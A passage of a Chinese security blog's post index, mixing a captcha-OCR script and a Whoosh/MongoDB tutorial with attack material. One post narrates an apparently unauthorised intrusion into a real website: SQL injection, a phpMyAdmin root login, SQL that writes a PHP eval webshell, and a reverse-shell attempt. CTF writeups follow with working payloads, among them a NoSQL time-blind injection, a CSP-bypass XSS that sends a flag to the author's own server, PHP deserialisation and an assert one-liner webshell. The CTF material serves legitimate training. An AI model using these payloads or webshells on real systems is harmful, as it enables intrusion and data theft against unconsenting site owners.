\"https://www.baidu.com\"browser.get(host)# 获取整个网页的截图browser.save_screenshot(\"temp.png\")# 获取元素位置element = browser.find_element_by_css_selector(\"img\")location = element.locationsize = element.size# # 计算出元素位置图像坐标img = Image.open(\"temp.png\")left = location['x'] + 145top = location['y'] + 90right = location['x'] + size['width'] + 155bottom = location['y'] + size['height'] + 100img = img.crop((int(left), int(top), int(right), int(bottom)))img.save('screenshot.png') # 是否保存图像log = os.system('tesseract screenshot.png png -l eng')keyword = open('png.txt', 'r').readline().rstrip('\\n')rex = re.compile(r'\\D')if re.search(rex, keyword) != None: print('错误的验证码：' + keyword)else: print('keyword is ' + keyword) &emsp;代码说明：selenium自带有截图功能，如果是选择非PhantomJS作为浏览器的话，当使用browser.save_screenshot(&quot;temp.png&quot;)时截的只是当前浏览器窗口显示的图片而不是整个网页，但使用PhantomJS时，截取的是整个网页。&emsp;selenium也可以选择区域或网页元素进行截图，不过需要PIL辅助，先从网页中获取该元素的位置，然后使用PIL Image里的crop截取。这里需要注意，如果使用例如Chrome等浏览器而非PhantomJS的话，会因为浏览器弹出的位置不同，导致无法准确的截到该元素的位置，需要自己反复调节，但使用PhantomJS时不会有这个问题。 &emsp;可以注意到，我这里是使用系统调用的方法进行识别，但有另一种方法是安装pyocr。直接执行pip install pyocr即可。由于作者不熟悉，加之有急需，故不再演示，只提出方法。","link":"/2017/11/selenium-verity-code/"},{"title":"[实战]从SQL注入到webshell","text":"前言&emsp;&emsp;由于上篇实在是水了，，，所以就网上搜集了一番，然后就找到了一个。。。 &emsp;&emsp;首先检查一下sql注入，然后在下载文件的地方发现了一处，而且还把网站的物理路径暴露出来了。 &emsp;&emsp;接着就找了下验证的POC，发现它过滤了空格，因为当and 1=2的时候也返回了真。 &emsp;&emsp;所以考虑使用/**/太代替空格，发现确实可行。123poc: ?sid=1300/**/and/**/1=2?sid=1300/**/and/**/1=1 &emsp;&emsp;如图： &emsp;&emsp;所以接下来我就是用了sqlmap进行注入，只需要加上--tamper space2comment。经过好一番的查找，才拿到了数据库中的账号和密码。 &emsp;&emsp;按照套路，我们就要找后台了。但这里并没有那么愉快，扫描了一下网站目录，却没有找到有价值的线索。只是暴露了几个目录遍历漏洞。 &emsp;&emsp;而且从账号上暴露的phpmyadmin用户猜想到有phpmyadmin目录，但是也没有找到。 &emsp;&emsp;然后就想使用XSS看看能不能找到管理员的后台地址，但结果是留言板确实是存在xss但却没有找到管理员的地址。 &emsp;&emsp;带着cookie访问XSS打到的网址是报了个验证码错误，所以这条线也走不了了。 &emsp;&emsp;后来经前辈提醒，可以直接使用http://ip/phpmyadmin的访问方式试试，那么首先检测一下有没有CDN。用多地ping检测了一下，发现应该是没有CDN，然后直接访问看看。 &emsp;&emsp;最后使用root账号密码登陆进去了。由于物理路径已经知道了，那么后面的操作就简单了，直接使用mysql写一句话后门。1234Create TABLE a (cmd text NOT NULL);Insert INTO a (cmd) VALUES('&lt;?php @eval($_POST[cmd])?&gt;');select cmd from a into outfile 'C:/暴露出来的根路径/out.php';Drop TABLE IF EXISTS a; &emsp;&emsp;随便找个表执行下上面的sql语句即可。 &emsp;&emsp;然后访问根目录下的out.php。 &emsp;&emsp;但是使用菜刀连接时却发现连接不上，估计是有WAF。而从phpinfo暴露出来的环境可以知道是内网，并且权限很高，所以心就更痒痒了。 &emsp;&emsp;所以我们要采用迂回战术，，，我们看看能不能反弹shell。但是发现反弹回来立马被干掉了。。。 &emsp;&emsp;看看目标的进程，发现是趋势杀软。 &emsp;&emsp;这里尝试将它的进程结束掉，但却没有用。由于明天强网杯，而且杀软也还没想到法绕过，所以暂且放下，两天后再战。。。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/03/shentou-tw/"},{"title":"学习中的一些代码及小tips记录","text":"介绍&emsp;本项目记录各种代码及小tips，项目地址为：https://github.com/DelCoding/MyCodes， 这篇文章将持续更新。 代码记录 1、将中缀表达式转化成后缀表达式 2、获取本机IP，并通过邮箱发送 3、Java多线程多人聊天室 MulitServer.java是服务器版 Mulitclient.java是客户端 4、idea下使用JavaBean 5、银行家算法 6、计算一个文件的16位校验和算法 7、使用whoosh为mongodb建立索引","link":"/2017/12/some-codes/"},{"title":"tamu ctf writeup","text":"前言&emsp;&emsp;好像很久没更新blog了，昨天接到任务要做tamu的ctf，所以做完记录一下。 1、介绍题&emsp;&emsp;Flag很明显（gigem{Howdy!}），主要是熟悉flag形式。 2、杂项1 &emsp;&emsp;将附件下载后使用binwalk分析文件，可以看到有隐藏文件，再使用foremost分离文件，解压后可以在document.xml里找到flag。这里另一种解题方法就是将这些附件还原成doc或docx。 &emsp;&emsp;所以flag就是：Flag=ICanRead!（不要自己脑补格式…）### 3、杂项2 &emsp;&emsp;按要求登陆，登陆后。 &emsp;&emsp;Tips: 使用ls –a，简单粗暴点。### 4、web3 &emsp;&emsp;看到robots就预感跟robots.txt有关，打开网页，google bot。。。 &emsp;&emsp;Flag：gigem{craw1ing_bot$!}### 5、web4 &emsp;&emsp;注意标题“SQLi”，明显是一道sql注入题，sqlmap三连后可以得到账号密码。登陆后即可得到flag：gigem{ScRuB7h3InpU7}。 6、Scenario – MCCU：01_logs&emsp;&emsp;这道题连蒙带猜。。。一看题目，先fuzz一波。。 &emsp;&emsp;得到：1：web；2：access.log…&emsp;&emsp;因为一般入侵都不太可能一次试探就成功，所以打算在error.log里找IP，这里看完后也就两个IP：172.16.20.134跟172.16.20.24。得到：3：172.16.20.24。&emsp;&emsp;时间有点难找，所以我先跳过4，先做5。在access.log里把172.16.20.24所访问的页面全找出来，然后在/wp-content/plugins/wpshop/includes/ajax.php发现异常，提交后提示正确，所以时间也就是这次访问的时间。 &emsp;&emsp;所以flag：12345* 1：web；* 2：access.log；* 3：172.16.20.24；* 4： Nov/08-20:32:49；* 5：/wp-content/plugins/wpshop/includes/ajax.php。 &emsp;&emsp;注意4的时间格式，这里我交完就忘了要不要将Nov转成11，，，，再次提交又不再验证，，，反正时间是这个。。。 &emsp;&emsp;后来google了一下，发现是WordPress WPshop - 电子商务1.3.9.5，任意文件上传漏洞，这里mark一下。 Payload: https://github.com/XiphosResearch/exploits/tree/master/wpsh0pwn http://www.3xploi7.com/2015/12/wordpress-wpshop-ecommerce-1395.html 7、Scenario – MCCU：00_intrusion&emsp;&emsp;Fuzz即可。。。。 8、Scenario – ClandestineEnforced：01_Phishing&emsp;&emsp;题目的意思是找出钓鱼邮件，打开下面三个邮件，1，2很明显就是钓鱼邮件，所以flag：1,2，直接提交即可。 9、web1&emsp;&emsp;这道题为自己蠢哭。。。。都说reading了，，，就是脑子抽风了不知道咋整，还好解了其他题，脑子回来了。。。 &emsp;&emsp;慢慢reading，，，终于在某一行找到了flag。。。。 &emsp;&emsp;所以flag：gigem{F!nD_a_F!AG!}### 10、web2 &emsp;&emsp;打开burp suite，把两个按钮的包抓一下， &emsp;&emsp;把veggie base64解码一下，可以发现有东西。 &emsp;&emsp;再看看第二个包， &emsp;&emsp;再把cookie的值base64解码一下。 &emsp;&emsp;所以flag：gigem{CrAzzYY_4_CO0k!es}### 11、Scenario – NotSoAwesomeInc：00_intrusion&emsp;&emsp;将附件下载后认真找就能找到答案。","link":"/2018/02/tamu-ctf-writeup/"},{"title":"Whoosh使用及为Mongodb建立索引","text":"介绍&emsp;&emsp;由于作者的项目中需要为数据库建立索引以便以搜索，经过考察后还是决定使用Whoosh+MongoDB的方案。所以这篇文章是介绍怎样使用whoosh为mongodb建立索引，网上关于这方面的文章还是相对比较少的，所以有必要记录一下。 &emsp;&emsp;whoosh是原生唯一的python写的全文搜索引擎，虽然说whoosh性能不一定比得上lucene,sphinx,xapian等,但由于是基于python，所以扩展性极好，非常容易集成到django或其他框架中，而且whoosh运行消耗的资源也比lucene等引擎少，加之作者的服务器性能较弱，数据量也还不大，就选择了whoosh作为搜索引擎。 架构方案&emsp;&emsp;作者使用的方案是：使用jieba为需要索引的whoosh的字段进行中文分词，搜索时，whoosh只返回_id字段的值，然后在mongodb中查找。当然，这个whoosh也可以把所有的字段都储存起来，这样就可以直接返回搜索结果，而省去在mongodb上查找的时间，但由此引发的一个问题就是索引文件过大，是空间利用问题，而且这样做就把whoosh当成了数据库角色。所以作者放弃了这一方案。 建立索引&emsp;&emsp;这里不介绍whoosh,mongodb的安装方法，请自行搜索。 123456789101112131415161718192021from whoosh.fields import Schema, TEXT, ID, DATETIMEfrom jieba.analyse import ChineseAnalyzerfrom whoosh.index import create_in, open_dirimport jiebajieba.load_userdict(\"dict.txt\")analyzer = ChineseAnalyzer()schema = Schema( nid=ID(unique=True, stored=True), url=ID(unique=True, stored=False), date=DATETIME(unique=False, stored=False, sortable=True), title=TEXT(stored=False, analyzer=analyzer), content=TEXT(stored=False, analyzer=analyzer) )if not os.path.exists('D:/pythonCode/whoosh/index/'): os.mkdir(\"D:/pythonCode/whoosh/index/\") create_in(\"D:/pythonCode/whoosh/index/\", schema) # 创建索引文件，需指定Schemaix = open_dir(\"D:/pythonCode/whoosh/index/\") #打开索引文件 &emsp;&emsp;因为whoosh是python实现的，所以很方便的就能跟结巴结合。而结巴允许的用户自定义字典，这对专业领域的分词很有帮助，我们只需要在dict.txt中存放专业名词就行。 &emsp;&emsp;索引首先需要定义Schema，stored代表是否存储这个字段的值，sortable为是否可以排序，这里因为是时间，所以我选择True，analyzer分词器，这里我们使用结巴中文分词器。这里再啰嗦几句，ID的值为不可分割，所以适合url、id等一类不用分割查找的项；DATETIME为时间，不用解释；这里的TEXT才是我们需要分词、建立索引的项目。 &emsp;&emsp;PPS：按照whoosh官方文档，对于简单的字段即使没有指定排序，但仍可以排序，只是结果可能不是那么完美。还有一种情况就是：如果你已经创建了Schema，并且写入数据，但是你想为某个字段排序，那么你可以使用：1234567from whoosh import sortingfrom whoosh.index import open_dirix = open_dir(\"D:/pythonCode/whoosh/index/\")with ix.writer() as w: sorting.add_sortable(w, \"date\", sorting.FieldFacet(\"date\")) 索引数据1234567891011121314151617from whoosh.index import create_in, open_dirclient = pymongo.MongoClient(\"xxx\")db = client['xxx']collections = db['xxx']ix = open_dir(\"D:/pythonCode/whoosh/index/\") #打开索引文件_id = collections.insert(dict(item))with ix.writer() as writer: writer.update_document( nid=_id.__str__(), url=item['url'], title=item['title'], date=datetime.strptime(item['date'], '%Y-%m-%d'), # 字符串化成时间格式 content=item['index_content'] ) &emsp;&emsp;在需要建立索引的地方使用如上代码。这里注意的一点是，mongodb插入数据返回的是ObjectId，如ObjectId(“5a2e2652c0bae92df4dd2372”)，而whoosh不支持存储ObjectId类型，所以我们需要的是括号里面的字符串，所以需要使用_id.__str__()提取。 搜索&emsp;&emsp;搜索代码如下：1234567891011121314151617181920212223242526from whoosh.index import create_in, open_dirfrom whoosh.qparser import MultifieldParser, QueryParserfrom whoosh import scoring, sortingfrom bson.objectid import ObjectIdclient = pymongo.MongoClient(\"xxx\")db = client['xxx']collections = db['xxx']ix = open_dir(\"D:/pythonCode/whoosh/index/\") #打开索引文件with ix.searcher() as searcher: query = MultifieldParser([\"title\", \"content\"], ix.schema).parse(\"xss\") #query = QueryParser(\"content\", ix.schema).parse(\"xss\") # 排序 mf = sorting.MultiFacet() mf.add_field(\"date\", reverse=True) results = searcher.search(query, limit=10, sortedby=mf) print(len(results)) for one in results: _id = ObjectId(one['nid']) # 将字符串构造成 ObjectId res = collections.find({'_id':_id})[0] print(res['date'] + res['title']) print('-----------------------\\n') count += 1 &emsp;&emsp;MultifieldParser是搜索多个field，也就是多个字段，而QueryParser只能搜索一个字段。sorting.MultiFacet()是whoosh中实现排序的一种方法，reverse=True是反向排序，这里实现的是时间降序。searcher.search(sortedby=mf)指定排序方式。其实whoosh里提供多种排序方法，功能还挺全面。 &emsp;&emsp;这里提供了mongodb如何使用_id查找的方法。 &emsp;&emsp;如果需要将_id中的值提取出来，则使用：12_id = collections.insert(dict(item))nid=_id.__str__() &emsp;&emsp;如果需要使用字符串查找，则使用：1234from bson.objectid import ObjectId_id = ObjectId(one['nid']) # 将字符串构造成 ObjectIdres = collections.find({'_id':_id})[0] &emsp;&emsp;完整的事例可查看此页面","link":"/2017/12/whoosh-mongo/"},{"title":"2018 TCTF-0CTF 部分Web writeup","text":"LoginMe&emsp;&emsp;这道题的writeup啃了一段时间，需要先入的概念是： 1、这道题是利用正则进行注入 2、由于req.body的存在不一定要存在username和password参数 &emsp;&emsp;下面是作者的调试代码，1234567891011121314151617181920212223242526app.post('/check', function (req, res) { var check_function = 'if(this.username == #username# &amp;&amp; #username# == \"admin\" &amp;&amp; hex_md5(#password#) == this.'+password_column+'){\\nreturn 1;\\n}else{\\nreturn 0;}'; console.log('=============================\\n'); for(var k in req.body){ var valid = ['#','(',')'].every((x)=&gt;{return req.body[k].indexOf(x) == -1}); if(!valid) res.send('Nope'); check_function = check_function.replace( new RegExp('#'+k+'#','gm') ,JSON.stringify(req.body[k])) // 输出每步的替换结果 console.log('正在替换：' + k + ' -----&gt; ' + req.body[k]); console.log(check_function); } console.log(check_function); var query = {\"$where\" : check_function}; console.log(query); console.log('================================\\n'); var newvalue = {$set : {last_access: moment().format('YYYY-MM-DD HH:mm:ss Z')}} dbo.collection(collection_name).updateOne(query,newvalue,function (e,r){ if(e) throw e; res.send('ok'); // ... implementing, plz dont release this. });}) &emsp;&emsp;这里用到了LoRexxar’s Blog中使用的基于时间盲注的方法，我们先看一下payload：1|#|=&amp;|this.*&quot;\\)|=&amp;|==|[]=%7C%7Ceval(&amp;%7C%22%22+%5C%5B%22%7C=a&amp;%7Ca%22%7C=%2B&amp;%7C%22%2B%7C=&amp;%7C%22%22%5C%5D%2b%7C=aaaa&amp;%7Caaaa%22%7C=%2B&amp;%7C%5C)%7B%7C%5B%5D=bbb).match(/^1.*/i)){sleep(4000);}else{return%20&amp;|\\[&quot;|=&amp;|&quot;&quot;b|=%2b&amp;|&quot;bb|=&amp;|return(\\s.*)*0|=11111 &emsp;&emsp;首先我们先绕过正则，我们可以通过|xxx|来绕过左右两边的#。比如提交|#|，后台就变成#|#|#，然后正则就会去匹配#，然后把它替换，有了这一点这个payload就容易理解了。 &emsp;&emsp;而在这个payload中我们只需要不断的修改match(/^1.*/i)进行匹配即可。我们先提交一下： &emsp;&emsp;可以看到明显延迟了4s，然后我们从控制台的输出信息里去理解这个payload的原理： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566=============================正在替换：|#| -----&gt;if(this.username == &quot;&quot;username&quot;&quot; &amp;&amp; &quot;&quot;username&quot;&quot; == &quot;admin&quot; &amp;&amp; hex_md5(&quot;&quot;password&quot;&quot;) == this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|this.*&quot;\\)| -----&gt;if(&quot;&quot; == this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|==| -----&gt; ||eval(if(&quot;&quot; [&quot;||eval(&quot;] this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|&quot;&quot; \\[&quot;| -----&gt; aif(&quot;a&quot;||eval(&quot;] this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|a&quot;| -----&gt; +if(&quot;&quot;+&quot;||eval(&quot;] this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|&quot;+| -----&gt;if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;] this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|&quot;&quot;\\]+| -----&gt; aaaaif(&quot;&quot;+&quot;&quot;||eval(&quot;aaaa&quot; this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|aaaa&quot;| -----&gt; +if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy){return 1;}else{return 0;}正在替换：|\\){| -----&gt; bbb).match(/^12.*/i)){sleep(4000);}else{returnif(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy[&quot;bbb).match(/^12.*/i)){sleep(4000);}else{return &quot;]return 1;}else{return 0;}正在替换：|\\[&quot;| -----&gt;if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy&quot;&quot;bbb).match(/^12.*/i)){sleep(4000);}else{return &quot;]return 1;}else{return 0;}正在替换：|&quot;&quot;b| -----&gt; +if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy&quot;+&quot;bb).match(/^12.*/i)){sleep(4000);}else{return &quot;]return 1;}else{return 0;}正在替换：|&quot;bb| -----&gt;if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy&quot;+&quot;&quot;).match(/^12.*/i)){sleep(4000);}else{return &quot;]return 1;}else{return 0;}正在替换：|return(\\s.*)*0| -----&gt; 11111if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy&quot;+&quot;&quot;).match(/^12.*/i)){sleep(4000);}else{&quot;11111\\r\\n&quot;;}{ &apos;$where&apos;: &apos;if(&quot;&quot;+&quot;&quot;||eval(&quot;&quot;+&quot; this.password_nnuty7q6zy&quot;+&quot;&quot;).match(/^12.*/i)){sleep(4000);}else{&quot;11111\\\\r\\\\n&quot;;}&apos; }================================ &emsp;&emsp;有了上面的说明，再加上调试信息，我们就很容易理解这个payload了。 Bl0g&emsp;&emsp;这道题跟强网杯的Share your mind有点相似，它是考察RPO，这里是CSP，但是触发方法都是一样的，都是提交url后用xss bot激发。 &emsp;&emsp;首先这个站点的功能如下： &emsp;&emsp;可以发现flag就在/flag下，但只有admin才能查看，非常明显的xss利用。 &emsp;&emsp;所以粗略的攻击链就出来了，我们在/new里插入恶意xss，然后在/submit中提交恶意的url，这个url的目的就是让bot访问/flag，然后传回flag。 &emsp;&emsp;所以我们先找到一个xss，经过探测我们可以发现在/new下post请求里的effect参数没有做任何过滤。插入的效果如下： &emsp;&emsp;这里虽然你已经插入了script，但由于CSP的保护，你的内嵌script的不能执行了，所以就没有了弹窗。相应的CSP如下：12Content-Security-Policy:script-src &apos;self&apos; &apos;unsafe-inline&apos;Content-Security-Policy:default-src &apos;none&apos;; script-src &apos;nonce-oPxSn4qhUHs6fU+ftUe/xpPI8WM=&apos; &apos;strict-dynamic&apos;; style-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src &apos;self&apos;; font-src &apos;self&apos; data:; connect-src &apos;self&apos;; base-uri &apos;none&apos; &emsp;&emsp;相关的script-src值及其含义如下：1234&apos;unsafe-inline&apos;：允许执行页面内嵌的&amp;lt;script&gt;标签和事件监听函数unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。 &emsp;&emsp;注意到这里的script-src： 'self'，'nonce-oPxSn4qhUHs6fU+ftUe/xpPI8WM='，说明它只允许加载本站的script，而且script必须有一个token，就例如： &emsp;&emsp;满足上述条件的script才能被执行，而很明显，我们插入的script并没有token，所以也就无法执行了。 &emsp;&emsp;然而题目还是有解的，我们查看下article.js：123$(document).ready(function(){ $(\"body\").append((effects[$(\"#effect\").val()]));}); &emsp;&emsp;可以发现这里存在动态插入任意值的漏洞，所以，我们可以通过动态插入script标签来绕过CSP。 &emsp;&emsp;effects的定义可以在config.js中找到 &emsp;&emsp;我们接下去的目的就是考虑能不能控制effects的值，下面引用了lorexxar师傅的原话： 在js中，对于特定的form,iframe,applet,embed,object,img标签，我们可以通过设置id或者name来使得通过id或name获取标签 &emsp;&emsp;也就是说，我们可以通过effects获取到&lt;form name=effects&gt;这个标签。同理，我们就可以通过插入这个标签来注册effects这个变量。再看看这些js文件的导入顺序，我们发现config.js是第一个被导入的。 &emsp;&emsp;所以我们传入：1id&quot;&gt;&lt;form name=effects id=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt; &emsp;&emsp;效果如下： &emsp;&emsp;可以看到payload最后一个script刚好把config.js给闭合了，并且由于CSP，闭合掉的script标签没有token并不能执行。再加上：12$(&quot;#effect&quot;).val() --&gt; ideffects[id] --&gt; &lt;script&gt;alert(1)&lt;/script&gt; &emsp;&emsp;所以成功的执行了弹窗测试。 &emsp;&emsp;接着就构造payload获取flag了，需要注意的一点是effect参数最长只有70个字符，所以我们无法直接在/new页面上获取到flag，这时候，我们在看/submit里可以提交一个url，而http://202.120.7.197:8090/login?next=//www.baidu.com是可以任意跳转的，所以我们可以让它跳转到自己的服务器上加载恶意代码，跟/new打一个里应外合。 &emsp;&emsp;首先我们构造出payload：1effect=id&quot;&gt;&lt;form name=effects id=&quot;&lt;script&gt;$.get(&apos;/flag&apos;,e=&gt;name=e)&quot;&gt;&lt;script&gt; &emsp;&emsp;这里通过jquery get获取flag内容，通过箭头函数将返回赋值给window.name。对于windos.name的说明可以参考： window.name（一般在js代码里出现）的值不是一个普通的全局变量，而是当前窗口的名字，这里要注意的是每个iframe都有包裹它的window，而这个window是top window的子窗口，而它自然也有window.name的属性，window.name属性的神奇之处在于name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）。 &emsp;&emsp;然后我们在自己的服务器上放置如下html：12345&lt;iframe src=\"http://202.120.7.197:8090/article/3788\"&gt;&lt;/iframe&gt;&lt;script&gt; setTimeout(()=&gt;{frames[0].window.location.href='/'},1200) setTimeout(()=&gt;{location.href='http://ip:port/?'+frames[0].window.name},1500)&lt;/script&gt; &emsp;&emsp;然后在相应的端口上做好监听，之后在/submit提交你这个html文件的url地址。如：http://202.120.7.197:8090/login?next=//your_ip/evil.html。 &emsp;&emsp;最后就能发现flag已经打到你的服务器上了。 &emsp;&emsp;参考链接： &emsp;&emsp;&emsp;&emsp;http://www.ruanyifeng.com/blog/2016/09/csp.html&emsp;&emsp;&emsp;&emsp;https://lorexxar.cn/2018/04/05/0ctf2018-blog/&emsp;&emsp;&emsp;&emsp;https://blog.cal1.cn/post/0CTF%202018%20Quals%20Bl0g%20writeup&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/04/0ctf-writeup2/"},{"title":"bugku ctf writeup2","text":"前言&emsp;&emsp;这篇开始bugku高级篇。。。 WebXSS注入测试&emsp;&emsp;题目描述： 1、请注入一段XSS代码，获取Flag值2、必须包含alert(key)，key会自动被替换 &emsp;&emsp;随便测试了一下，发现会对字符进行实体编码。 &emsp;&emsp;注意到页面是utf-8编码，id传入代码会在s中运行，考虑将&lt;&gt;进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来&emsp;&emsp;所以payload：?id=\\u003cscript\\u003ealert(_key_)\\u003c/script\\u003e，访问后查看源代码即可得到flag。### never give up&emsp;&emsp;查看题目的源代码如下： &emsp;&emsp;访问1p.html，注意是在查看源代码的地方访问，然后可以发现加密了的字符串。 &emsp;&emsp;拿去解密，这里不累赘。直接放出源代码：1234567891011121314151617181920212223if(!$_GET['id']){ header('Location: hello.php?id=1'); exit();}$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')){ echo 'no no no no no no no'; return ;}$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4){ require(\"f4l2a3g.txt\");}else{ print \"never never never give up !!!\";}?&gt;&emsp;&emsp;可以看到flag文件已经暴露出来，直接访问也可以拿到flag。但这里介绍绕过检测拿到flag的方法。可以看到满足拿flag的条件有三个： 一：id&emsp;&emsp;&emsp;&emsp;id既要不等于0（if(!$_GET['id'])），又要等于0（$id==0）。所以这里我们要利用php的松散性，字符串跟0比较（==）是成立的，所以payload：&quot;aaa&quot; == 0 二：php伪协议&emsp;&emsp;&emsp;&emsp;$data = @file_get_contents($a,'r');的存在可以使用php://input在绕过，所以：a=php://input，然后在postbugku is a nice plateform!。 三：字符截断 &emsp;&emsp;&emsp;&emsp;假设：123$b = \"%0012345\"substr($b,0,1) --&gt; 将返回空（null）strlen($b)&gt;5 --&gt; 是成立的&emsp;&emsp;所以最终的payload：?id=aaa&amp;a=php://input&amp;b=%00abcde。 never give up&emsp;&emsp;查看网页源代码可以发现存在源码泄露漏洞。 &emsp;&emsp;使用php伪协议：php://input，php://filter可以读取index.php和hint.php的base64源码。 &emsp;&emsp;这里直接贴解密后的代码。index.php12345678910111213141516171819&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\")){ echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"不能现在就给你flag哦\"; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo \"you are not the number of bugku ! \"; } ?&gt;hint.php12345678910111213&lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); } } } ?&gt;&emsp;&emsp;从$password = unserialize($password);中很明显可以看到是反序列化漏洞，所以构造读取flag的payload：O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}。&emsp;&emsp;所以最终的payload为： &emsp;&emsp;这里要注意的是file=hint.php，因为要利用php对象反序列化要先声明对象，所以要将hint.php包含进来。&emsp;&emsp;总的来说，这道题的考察点算是比较多的，包括：php伪协议、文件包含、php反序列化，所以质量还是可以的。### 过狗一句话&emsp;&emsp;题目描述：&gt;http://120.24.86.145:8010/&gt;送给大家一个过狗一句话&gt;&lt;?php $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’]) ?&gt;&emsp;&emsp;这个一句话组合起来实际是：assert($_GET['s'])，验证一下，发现确实可行。 &emsp;&emsp;但发现在执行system函数的时候无返回结果估计被禁用了。 &emsp;&emsp;接着使用php读取文件的代码：1eval(\"echo file_get_contents('flag.txt');\") &emsp;&emsp;这里的flag.txt是我自己猜测的，但结果还真被我猜对了。。。&emsp;&emsp;这道题解得有点侥幸，如果flag不存放在flag.txt，那么这方法将利用不了，所以为了解决这个问题，自己特别找了这道题的writeup，介绍一种使用php代码遍历当前目录的文件的方法：php中的glob()函数，详细说明如下： &emsp;&emsp;所以我们可以使用print_r(glob(&quot;*.*&quot;))来打印当前目录下存在的文件。 &emsp;&emsp;然后再介绍几种读取文件的方法：123show_source('flag.txt');var_dump(file(\"flag.txt\"));print_r(file(\"flag.txt\"));### 字符？正则？12345678&lt;?php highlight_file('2.php');$key='KEY{********************************}';$IM= preg_match(\"/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM ){ die('key is: '.$key);}?&gt;&emsp;&emsp;这个还是比较简单的，其中一个payload：?id=keyaaakeybbbbbkey:/c/dddkeye.。 各种绕过&emsp;&emsp;题目代码：12345678910111213&lt;?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag{xxxxxxxxxxxxxxxxxx}'; if (isset($_GET['uname']) and isset($_POST['passwd'])) { if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; } ?&gt; &emsp;&emsp;sha1的绕过跟md5一样使用数组即可，注意请求的方式。 web8&emsp;&emsp;题目源码：123456789101112131415&lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";}else{echo \"&lt;p&gt;sorry!&lt;/p&gt;\";}}?&gt; &emsp;&emsp;解题的关键在于extract($_GET)函数，它会将数组中的值按键值赋值，例如：?id=1&amp;name=junay&amp;key=key，经过extract的处理后会产生：123$id = 1;$name = \"junay\";$key = \"key\"; &emsp;&emsp;所以我们构造$ac跟$fn，其中$fn使用php://input伪协议。最终的payload： 细心&emsp;&emsp;打开页面发现是404，但是对这个站熟悉的话，正常返回的404是不一样的，所以这个404是骗人的，而且通过网络可以验证这一点。 &emsp;&emsp;同时，这里看到No such file or directory.，还给你加红显示，估计就是想让你爆目录，拿出扫描工具，结果如下。 &emsp;&emsp;访问robots.txt，可以发现线索。 &emsp;&emsp;再跟下去可以发现真正的页面 &emsp;&emsp;因为题目说想办法变成admin，所以尝试构造x=admin试试，结果flag就出来了。 求getshell&emsp;&emsp;题目： &emsp;&emsp;这道题是看writeup做出来的，一开始测试时没有想到改Content-Type，其实只需要将其中的一个字母大写就可以了，然后测试php2, php3, php4, php5，phps, pht, phtm, phtml，发现只有php5能绕过。所以payload就是： &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/03/bugku-ctf-writeup2/"},{"title":"bugku ctf writeup1","text":"前言&emsp;&emsp;此篇文章记录bugku中作者觉得比较有价值的writeup。 